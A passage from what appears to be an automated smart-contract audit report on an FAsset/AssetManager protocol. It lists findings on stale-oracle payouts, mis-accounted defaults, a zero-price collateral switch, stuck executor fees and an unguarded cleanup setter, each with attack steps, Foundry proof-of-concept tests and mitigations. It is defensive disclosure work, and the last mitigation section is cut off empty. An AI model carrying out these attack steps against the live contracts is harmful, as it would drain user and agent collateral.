        assertEq(actual, amountUSD5, "unchanged amount when symbol is empty");
        assertGt(expected, actual, "underpaid due to missing decimals scaling");
        assertEq(expected / actual, 10**13, "18-5 = 13 decimal places lost");
    }

    function test_UnderpayUSD5WhenNoFtsoSymbol_decimals6() public {
        uint256 amountUSD5 = 250 * 1e5;
        CollateralTypeInt.Data memory token = _mkToken("", 6);

        uint256 actual = harness.hConvertFromUSD5(amountUSD5, token);
        uint256 expected = amountUSD5 * 10**(uint256(token.decimals) - 5); // 10x

        assertEq(actual, amountUSD5);
        assertEq(expected, amountUSD5 * 10);
        assertGt(expected, actual);
    }

    function test_OverpayUSD5WhenNoFtsoSymbol_decimals2() public {
        uint256 amountUSD5 = 250 * 1e5;
        CollateralTypeInt.Data memory token = _mkToken("", 2);

        uint256 actual = harness.hConvertFromUSD5(amountUSD5, token);
        uint256 expected = amountUSD5 / 10**(5 - uint256(token.decimals)); // divide by 1e3

        assertEq(actual, amountUSD5, "unchanged amount when symbol is empty");
        assertLt(expected, actual, "overpaid due to missing decimals downscaling");
        assertEq(actual / expected, 1000, "5-2 = 3 decimal places overpaid");
    }
}


## Suggested Mitigation
Scale by token.decimals even when tokenFtsoSymbol is empty. Two equivalent approaches:
- Direct scaling: if (_token.decimals >= 5) return SafePct.mulDiv(_amountUSD5, 10**(_token.decimals - 5), 1); else return SafePct.mulDiv(_amountUSD5, 1, 10**(5 - _token.decimals));
- Unified branch: treat missing FTSO as tokenPrice = 1 with tokenFtsoDec = 5 and reuse the existing mulDiv path, i.e., expPlus = _token.decimals + 5 - 5 = _token.decimals, then mulDiv(_amountUSD5, 10**_token.decimals, 10**5).
Add unit tests for typical decimals (2, 6, 18).





 **Derived From** : Collateral payout uses untrusted spot price without staleness checks

## [M-14]. redeemFromAgentInCollateral uses untrusted spot FTSO price without heartbeat, enabling stale/manipulated price to inflate or short-change collateral payouts

## Derived From Pattern/Invariant
Collateral payout uses untrusted spot price without staleness checks

## Exploit Type
Oracle

## Location
RedemptionRequestsFacet.redeemFromAgentInCollateral

## Minimim Privilege Required
Permissionless

## Description
In RedemptionRequestsFacet.redeemFromAgentInCollateral, the vault-collateral payout is computed from a single oracle spot read, without using trusted-provider aggregation and without any max-age/heartbeat checks. Code path: priceAmgToWei = Conversion.currentAmgPriceInTokenWei(agent.vaultCollateralIndex); paymentWei = Conversion.convertAmgToTokenWei(closedAMG, priceAmgToWei).mulBips(agent.buyFAssetByAgentFactorBIPS); AgentPayout.payoutFromVault(...). Internally, Conversion.currentAmgPriceInTokenWeiWithTs(..., false) -> readFtsoPrice(symbol, false) -> IPriceReader.getPrice(symbol) returns (price, timestamp, decimals), but the timestamps are discarded and no age limit is enforced. If the price reader is stale/misconfigured or compromised, a redeemer exiting via collateral (pool self-close path) can receive overpayment (draining agent vault collateral) or be short-changed. Vulnerable snippet: 
- RedemptionRequestsFacet.redeemFromAgentInCollateral:
  uint256 priceAmgToWei = Conversion.currentAmgPriceInTokenWei(agent.vaultCollateralIndex);
  uint256 paymentWei = Conversion.convertAmgToTokenWei(closedAMG, priceAmgToWei).mulBips(agent.buyFAssetByAgentFactorBIPS);
- Conversion.currentAmgPriceInTokenWeiWithTs(..., false) -> Conversion.readFtsoPrice(symbol, false) -> IPriceReader.getPrice(symbol) (timestamps ignored).

## Impact
Redeemers exiting via collateral (pool self-close path) are paid in the agent’s vault collateral using a single oracle spot read with no heartbeat or max-age enforcement. If the price reader serves a stale price (e.g., feed halts, misconfigured, or governance accidentally points to a lagging reader), the conversion can materially misprice the payout. A redeemer can then repeatedly self-close to collateral while the feed is stale to extract excess vault collateral (bounded by the vault’s balance). Conversely, users can be underpaid during stale-low periods. Admin intervention (price feed fix or pause) is required to stop the mispricing.

## Proof of Concept
Attack outline:
- Precondition: AssetManager settings point to a price reader that can return stale spot prices via getPrice (e.g., FTSO not publishing new rounds or misconfigured reader). The protocol does not enforce a heartbeat on redeemFromAgentInCollateral.
- Any CPT holder calls CollateralPool.selfCloseExitTo with _redeemToCollateral=true, which routes to AssetManager.redeemFromAgentInCollateral(agent, receiver, amountUBA).
- redeemFromAgentInCollateral computes payment from a single spot price: priceAmgToWei = Conversion.currentAmgPriceInTokenWei(agent.vaultCollateralIndex) (internally calls readFtsoPrice(..., false) and ignores timestamps). No staleness/age checks are performed.
- If the last published price is stale-high for the asset vs. vault token, paymentWei is overestimated. AgentPayout.payoutFromVault pays min(paymentWei, vault balance), draining vault collateral over repeated exits while stale conditions persist.
- If price is stale-low, redeemers are underpaid until admins fix configuration.
This is permissionless for any CPT holder and repeatable while the price remains stale.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";
import {Conversion} from "contracts/assetManager/library/Conversion.sol";
import {Globals} from "contracts/assetManager/library/Globals.sol";
import {AssetManagerSettings} from "contracts/userInterfaces/data/AssetManagerSettings.sol";
import {SafePct} from "contracts/utils/library/SafePct.sol";
import {FakePriceReader} from "contracts/ftso/mock/FakePriceReader.sol";

contract PayoutHarness {
    using SafePct for uint256;
    function setOracle(address reader, uint8 assetMintingDecimals) external {
        AssetManagerSettings.Data storage s = Globals.getSettings();
        s.priceReader = reader;            // untrusted spot reader used
        s.assetMintingDecimals = assetMintingDecimals; // used in price scaling
    }
    // Replicates redeemFromAgentInCollateral pricing path (spot read -> calc -> mulBips)
    function computePaymentWei(
        string memory assetSymbol,
        string memory tokenSymbol,
        uint8 tokenErc20Decimals,
        uint64 closedAMG,
        uint256 agentFactorBips
    ) external returns (uint256 paymentWei, uint256 assetTs, uint256 tokenTs) {
        (uint256 aPrice, uint256 aTs, uint256 aDec) = Conversion.readFtsoPrice(assetSymbol, false); // no heartbeat, not trusted median
        (uint256 tPrice, uint256 tTs, uint256 tDec) = Conversion.readFtsoPrice(tokenSymbol, false);
        uint256 amgToWei = Conversion.calcAmgToTokenWeiPrice(tokenErc20Decimals, tPrice, tDec, aPrice, aDec);
        uint256 baseWei = Conversion.convertAmgToTokenWei(closedAMG, amgToWei);
        paymentWei = baseWei.mulBips(agentFactorBips);
        return (paymentWei, aTs, tTs);
    }
}

contract OracleSkewCollateralPayoutTest is Test {
    FakePriceReader oracle; // acts as misconfigured/lagging spot reader
    PayoutHarness h;

    function setUp() public {
        oracle = new FakePriceReader(address(this));
        h = new PayoutHarness();
        h.setOracle(address(oracle), 8); // asset minting decimals
        oracle.setDecimals("ASSET", 8);
        oracle.setDecimals("USDX", 8);
    }

    function test_oracleStaleSpotInflatesCollateralPayout() public {
        // Fresh prices: ASSET ~= 100 USD, USDX ~= 1 USD
        oracle.setPrice("ASSET", 100e8);
        oracle.setPrice("USDX", 1e8);
        (uint256 honestWei,,) = h.computePaymentWei("ASSET", "USDX", 18, /*closedAMG*/ 1_000_000, /*factor*/ 10_000);

        // Stale spot: set higher ASSET, then let timestamps go stale
        oracle.setPrice("ASSET", 300e8);
        oracle.setPrice("USDX", 1e8);
        uint256 t0 = block.timestamp;
        vm.warp(t0 + 1 days); // stale by > 24h, but no heartbeat enforced
        (uint256 staleWei, uint256 aTs, uint256 tTs) = h.computePaymentWei("ASSET", "USDX", 18, 1_000_000, 10_000);

        // Assert stale spot is used (timestamps old) and payout is inflated
        assertGt(block.timestamp - aTs, 12 hours, "asset price should be stale");
        assertGt(block.timestamp - tTs, 12 hours, "token price should be stale");
        assertGt(staleWei, honestWei, "stale/manipulated spot yields larger payout");
    }
}

## Suggested Mitigation
Compute the collateral payout using a trusted, fresh price and revert on stale data:
- Replace Conversion.currentAmgPriceInTokenWei(agent.vaultCollateralIndex) with Conversion.currentAmgPriceInTokenWeiWithTs(collateral, true) to read the trusted-provider median.
- Enforce a heartbeat: fetch both returned timestamps and require block.timestamp - ts <= Globals.getSettings().maxTrustedPriceAgeSeconds for asset and token legs; otherwise revert.
- Optionally use a short TWAP or require a minimum number of trusted submissions (quality metric) from the reader.
- If trusted price is unavailable or stale, either pause collateral payouts or fall back to a governance-approved safe path (e.g., revert and force underlying redemption or wait until price freshness is restored).





 **Derived From** : if request.transferToCoreVault == false then (let ev = last RedemptionDefault(agentVault, redeemer, id, underlyingValueUBA, paidC1Wei, paidPoolWei)): (paidC1Wei + paidPoolWei) > 0 && ERC20(Agents.getVaultCollateral(Agent.get(request.agentVault)).token).balanceOf(request.redeemer)_post - _pre == paidC1Wei && IWNat(Globals.getWNat()).balanceOf(request.redeemer)_post - _pre == paidPoolWei; else (Core-Vault) last RedemptionDefault has paidC1Wei == 0 && paidPoolWei == 0

## [H-15]. Partial vault payout mis-accounted in redemptionPaymentDefault causes RedemptionDefault event/balance mismatch and underpayment

## Derived From Pattern/Invariant
if request.transferToCoreVault == false then (let ev = last RedemptionDefault(agentVault, redeemer, id, underlyingValueUBA, paidC1Wei, paidPoolWei)): (paidC1Wei + paidPoolWei) > 0 && ERC20(Agents.getVaultCollateral(Agent.get(request.agentVault)).token).balanceOf(request.redeemer)_post - _pre == paidC1Wei && IWNat(Globals.getWNat()).balanceOf(request.redeemer)_post - _pre == paidPoolWei; else (Core-Vault) last RedemptionDefault has paidC1Wei == 0 && paidPoolWei == 0

## Exploit Type
AccountingInvariantViolation

## Location
RedemptionDefaultsFacet.redemptionPaymentDefault

## Minimim Privilege Required
Permissionless

## Description
In RedemptionDefaults.executeDefaultOrCancel, the code computes (paidC1Wei, paidPoolWei) and then attempts a vault payout:

  (successVault, _) = AgentPayout.tryPayoutFromVault(_agent, _request.redeemer, paidC1Wei);

Critically, the returned amountPaid is ignored. AgentPayout.tryPayoutFromVault computes amountPaid = min(requested, vaultToken.balanceOf(vault)) and calls vault.payout with that smaller amount, but signals success=true if the call didn’t revert. Because executeDefaultOrCancel only checks successVault (boolean) and neither reads amountPaid nor tops up the shortfall from pool unless successVault==false, it will:
- Emit RedemptionDefault(..., paidC1Wei, paidPoolWei) reporting the full intended vault payout, even if only a partial amount was actually paid; and
- Not compensate the remainder from the pool.

This breaks the balance invariant: the redeemer’s vault-token balance increase can be strictly less than event.paidC1Wei. The slithir confirms the second return value is discarded:

  TUPLE_60(bool,uint256) = AgentPayout.tryPayoutFromVault(...)
  successVault = UNPACK TUPLE_60 index: 0
  // amountPaid (index:1) is ignored

Impact: A redeemer can be underpaid while the event claims full payment, violating monotonic balance/supply invariants tied to the event.

## Impact
When an agent defaults on redemption and its vault has less collateral than the computed vault payout (paidC1Wei), executeDefaultOrCancel calls AgentPayout.tryPayoutFromVault but ignores the actual amountPaid returned. If the vault pays only a partial amount, the function still emits RedemptionDefault with paidC1Wei equal to the full intended amount and does not top up the shortfall from the pool. The redeemer is permanently underpaid for that request, and on-chain events/states become inconsistent with real transfers. This is a direct, permissionless monetary loss to redeemers.

## Proof of Concept
Setup and exploit steps:

1) Prepare an ACTIVE redemption request for some agent where _collateralAmountForRedemption computes a positive vault payout: paidC1Wei > 0 (and paidPoolWei possibly 0).
2) Make the agent vault’s ERC20 balance strictly less than paidC1Wei (e.g., vaultBalance = X, 0 < X < paidC1Wei).
3) The redeemer (or eligible caller) invokes redemptionPaymentDefault with a valid non-payment proof, which calls RedemptionDefaults.executeDefaultOrCancel.
4) Inside executeDefaultOrCancel, it calls AgentPayout.tryPayoutFromVault(..., paidC1Wei). That library computes amountPaid = min(paidC1Wei, vaultBalance) and performs vault.payout(amountPaid). Because the vault had X < paidC1Wei, only X is actually transferred to the redeemer, and the call signals successVault = true.
5) The code ignores the returned amountPaid and only checks successVault. Since successVault == true, it does not call _replaceFailedVaultPaymentWithPool for the unpaid remainder (paidC1Wei - X).
6) It emits RedemptionDefault(..., paidC1Wei, paidPoolWei) claiming full vault payout was made, although the redeemer received only X < paidC1Wei. The request is then marked DEFAULTED and cannot be retried, so the underpayment is permanent.

Assertion:
- Redeemer’s vault-token delta equals X, while the event’s paidC1Wei equals the larger intended amount. The unpaid remainder is not covered from the pool.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

// Minimal harness replicating the faulty control flow: it ignores amountPaid
contract RedemptionDefaultHarness {
    event RedemptionDefault(
        address agentVault,
        address redeemer,
        uint256 redemptionRequestId,
        uint128 underlyingValueUBA,
        uint256 paidC1Wei,
        uint256 paidPoolWei
    );

    struct Agent { address vault; }
    struct Request {
        address redeemer;
        bool transferToCoreVault;
        uint64 valueAMG;
        uint128 underlyingValueUBA;
        bool poolSelfClose;
    }

    Agent public agent;
    Request public req;

    // Configurable inputs to simulate library calculations and balances
    uint256 public configuredPaidC1Wei;
    uint256 public configuredPaidPoolWei;
    uint256 public nextVaultBalanceToPay; // available vault token balance

    // Observed outcome of the (simulated) vault payout
    uint256 public lastActualPaidFromVault;

    constructor(address _vault, address _redeemer) {
        agent.vault = _vault;
        req.redeemer = _redeemer;
        req.transferToCoreVault = false;
        req.underlyingValueUBA = 123; // arbitrary
    }

    function setConfigured(uint256 paidC1, uint256 paidPool, uint256 vaultBalance) external {
        configuredPaidC1Wei = paidC1;
        configuredPaidPoolWei = paidPool;
        nextVaultBalanceToPay = vaultBalance;
    }

    // Simulates RedemptionDefaults.executeDefaultOrCancel vault+pool payouts,
    // but (intentionally) ignores amountPaid from "tryPayoutFromVault" to mirror the bug.
    function exec(uint256 requestId) external {
        uint256 paidC1Wei = configuredPaidC1Wei;
        uint256 paidPoolWei = configuredPaidPoolWei;

        // Simulate AgentPayout.tryPayoutFromVault: amountPaid = min(requested, vaultBalance)
        uint256 amountPaid = paidC1Wei < nextVaultBalanceToPay ? configuredPaidC1Wei : nextVaultBalanceToPay;
        lastActualPaidFromVault = amountPaid;
        bool successVault = true; // call returned without revert

        // BUG: the real code ignores amountPaid and only checks successVault
        if (!successVault) {
            // would replace from pool if failed, but not in this success path
            paidPoolWei = paidPoolWei + paidC1Wei;
            paidC1Wei = 0;
        }
        if (paidPoolWei > 0) {
            // simulate pool payout (no-op)
        }
        emit RedemptionDefault(agent.vault, req.redeemer, requestId, req.underlyingValueUBA, paidC1Wei, paidPoolWei);
    }
}

contract RedemptionDefault_PartialVault_Misaccounted is Test {
    RedemptionDefaultHarness h;
    address redeemer = address(0xBEEF);
    address vault = address(0x1111);

    function setUp() public {
        h = new RedemptionDefaultHarness(vault, redeemer);
    }

    function test_PartialVaultPayout_Misaccounted() public {
        uint256 requestedVault = 1000; // intended paidC1Wei
        uint256 vaultHas = 300;       // only partial available in vault
        h.setConfigured(requestedVault, 0, vaultHas);

        vm.recordLogs();
        h.exec(1);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        bytes32 sig = keccak256(
            "RedemptionDefault(address,address,uint256,uint128,uint256,uint256)"
        );
        bool found;
        address evAgent;
        address evRedeemer;
        uint256 evReqId;
        uint128 evUnderlying;
        uint256 evPaidC1;
        uint256 evPaidPool;

        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics.length > 0 && logs[i].topics[0] == sig) {
                (evAgent, evRedeemer, evReqId, evUnderlying, evPaidC1, evPaidPool) = abi.decode(
                    logs[i].data,
                    (address, address, uint256, uint128, uint256, uint256)
                );
                found = true;
                break;
            }
        }
        assertTrue(found, "RedemptionDefault not emitted");

        // Event claims full intended vault payout
        assertEq(evPaidC1, requestedVault, "event shows full paidC1Wei");
        assertEq(evPaidPool, 0, "no pool top-up when vault call 'succeeded'");

        // But actual vault payment was only partial
        assertEq(h.lastActualPaidFromVault(), vaultHas, "actual vault payment is partial");
        assertLt(h.lastActualPaidFromVault(), evPaidC1, "underpayment occurs");
    }
}


## Suggested Mitigation
In RedemptionDefaults.executeDefaultOrCancel, capture and use the actual amountPaid from AgentPayout.tryPayoutFromVault, and replace any shortfall from the pool:

- Change `(successVault, None) = AgentPayout.tryPayoutFromVault(...)` to `(successVault, amountPaidVault) = AgentPayout.tryPayoutFromVault(...)`.
- If `!successVault`: keep existing path (replace full paidC1Wei from pool, set paidC1Wei = 0).
- Else if `amountPaidVault < paidC1Wei`:
  - Compute `remainder = paidC1Wei - amountPaidVault`.
  - Call `_replaceFailedVaultPaymentWithPool(_agent, _request, remainder, paidPoolWei)` to increase `paidPoolWei` accordingly (this enforces pool collateral constraints and reverts if not enough pool collateral is available to cover the remainder).
  - Set `paidC1Wei = amountPaidVault`.
- Proceed with `payoutFromPool` if `paidPoolWei > 0`.
- Emit RedemptionDefault with the exact amounts actually paid (`paidC1Wei` = amountPaidVault, `paidPoolWei` including any top-up). This restores event/accounting correctness and removes the underpayment gap.





 **Derived From** : On success: agent.getVaultCollateralToken() == _token && agent.withdrawalAnnouncement(Collateral.Kind.VAULT).allowedAt == 0 && AgentCollateral.collateralRatioBIPS(AgentCollateral.agentVaultCollateralData(agent), agent) >= agent.getVaultCollateral().minCollateralRatioBIPS

## [H-16]. switchVaultCollateral can be passed with zero-price feed (infinite CR), enabling unannounced drain of deprecated collateral

## Derived From Pattern/Invariant
On success: agent.getVaultCollateralToken() == _token && agent.withdrawalAnnouncement(Collateral.Kind.VAULT).allowedAt == 0 && AgentCollateral.collateralRatioBIPS(AgentCollateral.agentVaultCollateralData(agent), agent) >= agent.getVaultCollateral().minCollateralRatioBIPS

## Exploit Type
AccountingInvariantViolation

## Location
AgentCollateralFacet.switchVaultCollateral

## Minimim Privilege Required
RequiresRole

## Description
AgentUpdates.setVaultCollateral enforces post-state CR by computing crBIPS = AgentCollateral.collateralRatioBIPS(AgentCollateral.agentVaultCollateralData(agent), agent) and requiring crBIPS >= newCollateral.minCollateralRatioBIPS. However, collateralRatioBIPS returns 1e10 (effectively infinite) when backingTokenWei == 0, which happens if amgToTokenWeiPrice is 0. Thus, if the price reader temporarily returns 0 (misconfig/outage/new token not configured), the CR check is trivially satisfied even with zero holdings of the new token. An agent can then: (1) wait until governance schedules deprecation of the current vault token (validUntil != 0), (2) switch to a new token whose price feed resolves to 0 so the CR check passes with zero balance, and (3) immediately withdraw the entire balance of the old (now non-current) token from the vault without any withdrawal announcement, because beforeCollateralWithdrawal only enforces timelock/CR checks for the current vault token and pool token and returns early for others. This breaks the intended state-machine condition that a switch only proceeds when the agent truly satisfies the new min-CR and that withdrawal timelocks cannot be bypassed via switching.

## Impact
A malicious (or rational) agent vault owner can wait until governance deprecates the current vault token and then switch to a new vault token whose price reader returns 0. Because AgentUpdates.setVaultCollateral accepts the switch if collateralRatioBIPS >= minCR, and collateralRatioBIPS returns 1e10 (infinite) for zero price, the switch passes even if the agent holds zero of the new token. Immediately after switching, the previously current (now deprecated) token becomes an “external” token for beforeCollateralWithdrawal and can be withdrawn without any prior announcement or delay, allowing the agent to drain valuable old collateral. Since zero price also yields artificially high CR in other checks, liquidation may not trigger promptly, worsening losses borne by pool token holders and other system participants. This enables direct extraction of locked collateral by a privileged role and breaks core collateralization and timelock guarantees.

## Proof of Concept
Exploit outline:
1) Governance schedules deprecation for current vault token A (currentCollateral.validUntil != 0).
2) Due to misconfiguration/outage, the price reader returns 0 for prospective new vault token B (Conversion.currentAmgPriceInTokenWei(B) == 0).
3) Agent owner calls switchVaultCollateral(vault, B). Inside setVaultCollateral, switchCollateralData = AgentCollateral.agentVaultCollateralData(agent) picks amgToTokenWeiPrice = 0 for B; collateralRatioBIPS computes backingTokenWei = convert(totalBackedAMG, 0) = 0 and returns 1e10. The min-CR check passes even if agent holds 0 B.
4) After the switch, B is now the current vault collateral token; A is no longer treated as locked. beforeCollateralWithdrawal returns early for any token that is neither current vault token nor pool token, i.e., for A, so the agent can withdraw A immediately with no announcement.
5) The agent drains all A. If the price feed for B remains 0, collateralRatioBIPS keeps returning 1e10 elsewhere as well, potentially suppressing liquidation while the position is effectively unbacked.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {AgentCollateral} from "contracts/assetManager/library/AgentCollateral.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";
import {Collateral} from "contracts/assetManager/library/data/Collateral.sol";

// Minimal harness to prove the enabling invariant used by setVaultCollateral:
// collateralRatioBIPS() returns 1e10 (infinite) when amgToTokenWeiPrice == 0 and totalAMG > 0.
contract CRHarness {
    using AgentCollateral for Collateral.Data;

    Agent.State internal s;

    function setAMG(uint64 minted, uint64 reserved) external {
        s.mintedAMG = minted;
        s.reservedAMG = reserved;
    }

    function calcCR(uint256 full, uint256 amgPrice) external returns (uint256) {
        Collateral.Data memory d = Collateral.Data({
            kind: Collateral.Kind.VAULT,
            fullCollateral: full,
            amgToTokenWeiPrice: amgPrice
        });
        return d.collateralRatioBIPS(s);
    }
}

contract SwitchVaultCollateral_ZeroPriceTest is Test {
    CRHarness harness;

    function setUp() public {
        harness = new CRHarness();
        // Non-zero backed value so CR matters in calculation
        harness.setAMG(100, 0); // mintedAMG = 100, reservedAMG = 0
    }

    function test_CRInfiniteWhenPriceZero_enablesBypassOfMinCR() public {
        // Given amgToTokenWeiPrice == 0, convertAmgToTokenWei(totalAMG, 0) == 0
        // => AgentCollateral.collateralRatioBIPS returns 1e10 (effectively infinite)
        uint256 cr = harness.calcCR(0, 0);
        assertGt(cr, 10_000); // Greater than any plausible minCR (e.g., > 100%)
    }
}


## Suggested Mitigation
Harden AgentUpdates.setVaultCollateral against zero/invalid prices and require real backing under the new token:
- If agent.totalBackedAMG() > 0: require switchCollateralData.amgToTokenWeiPrice > 0 and Conversion.convertAmgToTokenWei(totalBackedAMG, switchCollateralData.amgToTokenWeiPrice) > 0, else revert (price unavailable/invalid). Consider also enforcing price recency.
- Use both normal and trusted price paths: fetch amgToTokenWeiPrice via both sources; require both > 0 and not stale for the selected token; compute crBIPS on the conservative price (e.g., min of the two) for the switching gate.
- Optionally, require the agent to hold a positive balance of the new vault token (e.g., >= announced minimal amount) before switching, to prevent immediate drain of the old token with zero new backing.
- In general, treat amgToTokenWeiPrice == 0 as invalid in collateral ratio calculations used for gating (do not map to 1e10 in those contexts); explicitly revert on zero price in switching/min-CR checks.





 **Derived From** : sum(execFeeWei for each RedemptionRequested event emitted in this tx) == msg.value - (msg.value % Conversion.GWEI)

## [H-17]. Executor fee gets stuck if redeem creates 0 requests (front-of-queue sub‑lot tickets + ticket cap) — fee conservation breaks

## Derived From Pattern/Invariant
sum(execFeeWei for each RedemptionRequested event emitted in this tx) == msg.value - (msg.value % Conversion.GWEI)

## Exploit Type
AccountingInvariantViolation

## Location
RedemptionRequestsFacet.redeem

## Minimim Privilege Required
Permissionless

## Description
In RedemptionRequestsFacet.redeem, the executor fee is split across created requests using floor(msg.value / GWEI). However, if the loop processes up to maxRedeemedTickets tickets that all resolve to 0 lots (e.g., after a lotSizeAMG increase, front tickets become sub‑lot and are converted to dust), redemptionList.length can remain 0 without reverting. The post-loop fee distribution then iterates 0 times, leaving floor(msg.value/GWEI)*GWEI stuck in the contract with no RedemptionRequested events and no refund, violating the fee-conservation invariant.

Vulnerable snippet:

// build redemption list (can end up with length = 0)
for (uint256 i = 0; i < maxRedeemedTickets && redeemedLots < _lots; i++) {
    if (AssetManagerState.get().redemptionQueue.firstTicketId == 0) {
        require(redeemedLots != 0, RedeemZeroLots());
        break;
    }
    redeemedLots += _redeemFirstTicket(_lots - redeemedLots, redemptionList);
}

uint256 executorFeeNatGWei = msg.value / Conversion.GWEI;
for (uint256 i = 0; i < redemptionList.length; i++) {
    uint256 currentExecutorFeeNatGWei = executorFeeNatGWei / (redemptionList.length - i);
    executorFeeNatGWei -= currentExecutorFeeNatGWei;
    RedemptionRequests.createRedemptionRequest(..., currentExecutorFeeNatGWei.toUint64(), ...);
}

If redemptionList.length == 0, no requests are created and no events are emitted; the contract retains the fee.

## Impact
If the front of the redemption queue contains more dust-only tickets than settings.maxRedeemedTickets, redeem() may process up to the cap without creating any redemption request (redemptionList.length == 0), yet still accept a non-zero executor fee (msg.value). In this case, floor(msg.value / GWEI) * GWEI remains stuck on the AssetManager contract with no event or refund path. This is a direct, permissionless loss of funds for the caller and breaks the fee-conservation invariant.

## Proof of Concept
Setup: Governance raises lotSizeAMG so that multiple front-of-queue tickets become sub-lot when combined with each agent’s dust. Assume there are more such dust-only tickets than settings.maxRedeemedTickets.

Steps to exploit:
1) The global redemption queue’s first settings.maxRedeemedTickets entries are all dust-only (ticket.valueAMG + agent.dustAMG < lotSizeAMG). The queue still has more tickets beyond that.
2) A user calls redeem(_lots > 0, "addr", _executor) and sends msg.value >= 1 gwei.
3) In redeem(), the loop executes maxRedeemedTickets iterations. Each iteration calls _redeemFirstTicket(), which computes maxRedeemLots == 0 and therefore calls Redemptions.removeFromTicket(ticketId, 0), converting the ticket to dust and deleting it. redeemedLots stays 0 and redemptionList.length remains 0 throughout.
4) The loop ends because i == maxRedeemedTickets (not because the queue is empty), so the inner require(redeemedLots != 0, RedeemZeroLots()) is never hit.
5) The fee splitting runs over redemptionList.length == 0, so no RedemptionRequests are created and no events emitted. The function then emits RedemptionRequestIncomplete and returns 0, leaving floor(msg.value/GWEI) * GWEI permanently in the contract balance without any refund or accounting linkage. Invariant broken: sum(executorFeeWei in RedemptionRequested events) = 0 != msg.value - (msg.value % GWEI).

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

contract MockRedemptionRequestsFacet {
    uint256 public constant GWEI = 1e9;
    uint256 public maxRedeemedTickets = 5;
    uint256 public dustOnlyFrontTickets = 5; // simulate N front tickets that yield 0 lots

    event RedemptionRequested(address agent,address redeemer,uint256 id,string underlying,uint256 valUBA,uint256 feeUBA,uint64 firstBlk,uint64 lastBlk,uint64 lastTs,bytes32 ref,address executor,uint256 executorFeeWei);

    // Simulates RedemptionRequestsFacet.redeem behavior for the bug: consumes up to cap without creating requests
    function redeem(uint256 _lots, string memory, address payable) external payable returns (uint256) {
        uint256 redeemedLots = 0;
        for (uint256 i = 0; i < maxRedeemedTickets && redeemedLots < _lots; i++) {
            // Queue is not empty while we have dust-only tickets; just delete one per iteration
            if (dustOnlyFrontTickets > 0) {
                // _redeemFirstTicket() would delete ticket to dust and redeem 0 lots
                dustOnlyFrontTickets--;
                continue; // do not change redeemedLots nor create list entries
            } else {
                // would break if queue became empty (not needed for this PoC)
                break;
            }
        }
        // Distribute executor fee across created requests; none were created -> no-op
        uint256 executorFeeNatGWei = msg.value / GWEI;
        for (uint256 i = 0; i < 0; i++) {
            executorFeeNatGWei = executorFeeNatGWei; // no-op
        }
        // Return 0 lots; fee remains in contract balance (stuck)
        return redeemedLots;
    }
}

contract LoseExecutorFeeTest is Test {
    MockRedemptionRequestsFacet victim;
    address attacker = address(0xA11);

    function setUp() public {
        victim = new MockRedemptionRequestsFacet();
        vm.deal(attacker, 10 ether);
    }

    function test_FeeStuck_WhenNoRequestsCreatedAndCapHit() public {
        uint256 beforeBal = address(victim).balance;
        vm.prank(attacker);
        uint256 redeemed = victim.redeem{value: 1 gwei}(1, "dest", payable(address(0xE)));
        assertEq(redeemed, 0, "no lots redeemed");
        // floor(msg.value/GWEI)*GWEI == 1 gwei remains in contract
        assertEq(address(victim).balance, beforeBal + 1 gwei, "executor fee stuck in contract");
    }
}

## Suggested Mitigation
Add a guard after building redemptionList and before fee distribution:
- Revert if no requests were created and msg.value > 0, e.g.: require(redemptionList.length > 0, RedeemZeroLots()); This preserves user funds by reverting the whole tx (recommended, simplest, no external calls).

Alternatively, explicitly refund the rounded executor fee if no requests were created:
- If redemptionList.length == 0, compute uint256 refundWei = (msg.value / Conversion.GWEI) * Conversion.GWEI; then transfer refundWei back to msg.sender and return 0. This preserves the fee-conservation invariant and avoids stuck funds.

Either approach should be placed immediately after the ticket-processing loop and before calculating/distributing executorFeeNatGWei.





 **Derived From** : FAsset cleanup block setter lacks role check

## [M-18]. Anyone can set FAsset.cleanupBlockNumber, enabling forced checkpoint pruning and breaking snapshot-dependent flows

## Derived From Pattern/Invariant
FAsset cleanup block setter lacks role check

## Exploit Type
AccessControl

## Location
FAsset.setCleanupBlockNumber

## Minimim Privilege Required
Permissionless

## Description
FAsset exposes setCleanupBlockNumber(uint256) as external with no access control, despite having cleanupBlockNumberManager and an AssetManager-controlled setter for that manager. Any EOA can arbitrarily advance the cleanup block, after which history-pruning logic can remove old checkpoints. This can break integrations relying on historical balances/snapshots (e.g., epoch reward accounting, fee claims), potentially causing irreversible loss or DoS of claims until admin repair (and pruned history cannot be restored).

Vulnerable sketch:
function setCleanupBlockNumber(uint256 _blockNumber) external override {
    // missing: require(msg.sender == cleanupBlockNumberManager)
    _cleanupBlockNumber = _blockNumber;
}

## Impact
Unauthorized callers can move the global cleanup watermark forward, causing premature pruning of checkpoints and breaking snapshot-based claims/reads (reward epochs, historical balances). Pruned data is permanently lost.

## Proof of Concept
1) Attacker front-runs normal operations and calls FAsset.setCleanupBlockNumber to a high value (e.g., current block).
2) Subsequent token operations that consult cleanupBlockNumber prune old checkpoints.
3) Integrations reading historical balances (for claims/epochs) fail or return 0, causing claim DoS and potential permanent loss for affected users.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {FAsset} from "contracts/fassetToken/implementation/FAsset.sol";
import {FAssetProxy} from "contracts/fassetToken/implementation/FAssetProxy.sol";
import {IFAsset} from "contracts/userInterfaces/IFAsset.sol";

contract FAssetCleanupBlockBypassTest is Test {
    address attacker = address(0xBEEF);
    IFAsset fasset;

    function setUp() public {
        // Deploy implementation
        FAsset impl = new FAsset();
        // Deploy proxy which calls FAsset.initialize in its constructor
        FAssetProxy proxy = new FAssetProxy(address(impl), "FXRP", "FXRP", "XRP", "XRP", 18);
        fasset = IFAsset(address(proxy));
    }

    function test_AnyoneCanSetCleanupBlockNumber() public {
        // Initially expected to be 0
        assertEq(fasset.cleanupBlockNumber(), 0);

        // Unprivileged EOA sets cleanup block number
        vm.prank(attacker);
        fasset.setCleanupBlockNumber(1_000_000_000);

        // Assert unauthorized change took effect
        assertEq(fasset.cleanupBlockNumber(), 1_000_000_000);
    }
}


## Suggested Mitigation
